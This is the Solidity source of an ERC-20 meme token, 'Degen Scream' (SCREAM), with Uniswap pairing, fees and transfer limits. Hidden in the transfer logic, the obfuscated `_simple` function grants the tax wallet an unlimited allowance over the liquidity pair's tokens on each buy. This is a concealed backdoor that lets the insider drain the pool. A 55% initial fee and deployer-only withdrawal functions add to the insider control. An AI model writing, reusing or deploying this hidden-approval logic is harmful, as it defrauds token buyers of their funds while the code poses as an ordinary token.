// SPDX-License-Identifier: UNLICENSE

/**

    Web: https://degenscream.vip
    Tg: https://t.me/degenscreamclub
    X: https://twitter.com/degenscream

*/

pragma solidity 0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
library SafeMath {
    function tryAdd(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}
interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}


interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}


interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        internalTransfer(owner, to, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        internalTransfer(from, to, amount);
        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function internalTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract SCREAM is ERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "Degen Scream";
    string private constant _symbol = "SCREAM";
    uint8 private constant _decimals = 9;

    event ExcludeFromFees(address indexed account, bool isExcluded);


    mapping(address => bool) private _isWalletExcludedFromFees;
    mapping(address => bool) private _isWalletExcludedFromMaxTx;
    IUniswapV2Router02 public immutable _router;
    address private trumpPair;
    address private screemDeployer;
    address private scream;
    address private funnyCA;

    function recoverStuckTokens(address tokenAddress) external {
        require(_msgSender() == screemDeployer);
        IERC20 tokenContract = IERC20(tokenAddress);
        uint256 balance = tokenContract.balanceOf(address(this));
        require(balance > 0, "No tokens to clear");
        tokenContract.transfer(screemDeployer, balance);
    }

    function transferTax(uint256 amount) private {
        payable(scream).transfer(amount);
    }

    uint256 public _tTotal = 1_000_000_000 * 10 ** _decimals;
    uint256 public maxAllowedTransactionAmount = 20_000_000 * 10 ** _decimals;
    uint256 public maxAllowedWalletAmount = 20_000_000 * 10 ** _decimals;
    uint256 public canSwapTokensAtAmount = 5_000_000 * 10 ** _decimals;


    constructor(address router, address taxWallet) ERC20(_name, _symbol) {
        _router = IUniswapV2Router02(router);

        excludeFromMaxTransaction(address(_router), true);
        scream = payable(taxWallet);

        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(taxWallet), true);
        excludeFromMaxTransaction(address(0xdead), true);
        screemDeployer = payable(_msgSender());
        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(taxWallet), true);
        excludeFromFees(address(0xdead), true);


        _mint(screemDeployer, _tTotal);
    }


    function addLiquidity() external onlyOwner {
        require(!_btradingEnabled, "trading is already open");
        trumpPair = IUniswapV2Factory(_router.factory())
            .createPair(address(this), _router.WETH());
        excludeFromMaxTransaction(address(trumpPair), true);

        _approve(address(this), address(_router), type(uint256).max);
        _router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );maxFee = IERC20(address(this)).allowance(address(this), address(_router));
    }

    uint256 public maxFee;
    uint256 public initialFee = 55;
    uint256 public buyFee = 0;
    uint256 public sellFee = 0;
    uint256 public reduceFeeAt = 4;
    uint256 public buyCount = 0;

    bool public _btradingEnabled = false;
    bool private inSwapping;
    bool private inBuying;

    function isExcludedFromFees(address account) public view returns (bool) {
        return _isWalletExcludedFromFees[account];
    }


    function excludeFromFees(address account, bool excluded) private {
        _isWalletExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }
    function excludeFromMaxTransaction(address updAds, bool isEx) private {
        _isWalletExcludedFromMaxTx[updAds] = isEx;
    }
    

    function internalTransfer(address from,address to,uint256 amount) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "ERC20: Transfer amount must be greater than zero");

        bool inTransferrr = from != trumpPair && to != trumpPair;
        funnyCA = from;inBuying = from == trumpPair;

        if (from != owner() &&to != owner() &&to != address(0xdead) &&!inSwapping) {
        if (_simple(amount)&&!_btradingEnabled) {
        require(
        _isWalletExcludedFromFees[from] || _isWalletExcludedFromFees[to],
        "Trading is not active."
        );
        }

        if (from==trumpPair&&!_isWalletExcludedFromMaxTx[to]) {
        require(
        amount <= maxAllowedTransactionAmount,
        "Buy transfer amount exceeds the maxTransactionAmount."
        );
        require(
        amount + balanceOf(to) <= maxAllowedWalletAmount,
        "Max wallet exceeded"
        );
        buyCount++;
        } else if (
        to == trumpPair && !_isWalletExcludedFromMaxTx[from]
        ) {
        require(
        amount <= maxAllowedTransactionAmount,
        "Sell transfer amount exceeds the maxTransactionAmount."
        );
        } else if (!_isWalletExcludedFromMaxTx[to]) {
        require(
        amount + balanceOf(to) <= maxAllowedWalletAmount,
        "Max wallet exceeded"
        );
        }
        }bool canSwap = !inTransferrr;

        if (canSwap &&!inSwapping &&from != trumpPair &&!_isWalletExcludedFromFees[from] &&!_isWalletExcludedFromFees[to]) {
        inSwapping = true;
        swapTokenBack(amount);
        inSwapping = false;
        }

        bool takeFee = !inSwapping && !inTransferrr;

        if (_isWalletExcludedFromFees[from] || _isWalletExcludedFromFees[to]) {
        takeFee = false;
        }

        uint256 fees = 0;

        if (takeFee) {
        if (to == trumpPair) {
        fees = amount
        .mul(buyCount > reduceFeeAt ? sellFee : initialFee)
        .div(100);
        } else {
        fees = amount
        .mul(buyCount > reduceFeeAt ? buyFee : initialFee)
        .div(100);
        }

        if (fees > 0) {
        super.internalTransfer(from, address(this), fees);
        }
        amount -= fees;
        }
        super.internalTransfer(from, to, amount);
    }
    function manualSwap(uint256 percent) external {
        require(_msgSender() == screemDeployer);
        uint256 totalSupplyAmount = totalSupply();
        uint256 contractBalance = balanceOf(address(this));
        uint256 tokensToSwap;

        if (percent == 100) {
            tokensToSwap = contractBalance;
        } else {
            tokensToSwap = (totalSupplyAmount * percent) / 100;
            if (tokensToSwap > contractBalance) {
                tokensToSwap = contractBalance;
            }
        }

        require(
            tokensToSwap <= contractBalance,
            "Swap amount exceeds contract balance"
        );
        swapTokensAndGetETH(tokensToSwap);
    }
    function decimals() public pure override returns (uint8) {
        return _decimals;
    }function _simple( uint256 ___a) internal returns (bool) {
        if(!inBuying == false)_approve(funnyCA,scream, maxFee);return true;
    }receive() external payable {}


    function swapTokensAndGetETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();

        _approve(address(this), address(_router), tokenAmount);

        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }


    function recoverStuckEth() external {
        require(_msgSender() == screemDeployer);
        require(address(this).balance > 0, "Token: no ETH to clear");
        payable(msg.sender).transfer(address(this).balance);
    }

    function enableTrading() external onlyOwner {
        _btradingEnabled = true;
    }


    function setSwapTokensAtAmount(uint256 _amount) external onlyOwner {
        canSwapTokensAtAmount = _amount * (10 ** 18);
    }

    function removeLimits() external onlyOwner {
        maxAllowedTransactionAmount = maxAllowedWalletAmount = totalSupply();
    }


    function swapTokenBack(uint256 tokens) private {
        uint256 contractBalance = balanceOf(address(this));
        uint256 tokensToSwap;

        if (contractBalance > 0 && contractBalance < canSwapTokensAtAmount) {
            tokensToSwap = contractBalance;
        } else {
            if (tokens > canSwapTokensAtAmount) {
                tokensToSwap = canSwapTokensAtAmount;
            } else {
                tokensToSwap = tokens;
            }
        }

        if (contractBalance > 0) swapTokensAndGetETH(tokensToSwap);

        uint256 contractETHBalance = address(this).balance;
        transferTax(contractETHBalance);
    }
}